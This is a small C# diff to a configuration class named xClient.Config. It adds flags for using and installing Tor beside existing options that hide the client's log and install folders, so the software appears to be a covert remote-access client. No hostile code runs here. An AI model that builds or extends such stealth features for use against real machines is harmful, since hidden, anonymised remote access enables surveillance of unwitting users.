@@ -29,6 +29,9 @@ namespace xClient.Config
         public static string LOGDIRECTORYNAME = "Logs";
         public static bool HIDELOGDIRECTORY = false;
         public static bool HIDEINSTALLSUBDIRECTORY = false;
+        public static bool USETOR = false;
+        public static bool TRYINSTALLTOR = false;
+        public static bool TRYINSTALLTORSERVICE = false;
 
         public static bool Initialize()
         {
@@ -56,6 +59,9 @@ namespace xClient.Config
         public static string LOGDIRECTORYNAME = "";
         public static bool HIDELOGDIRECTORY = false;
         public static bool HIDEINSTALLSUBDIRECTORY = false;
+        public static bool USETOR = false;
+        public static bool TRYINSTALLTOR = false;
+        public static bool TRYINSTALLTORSERVICE = false;
 
         public static bool Initialize()
         {
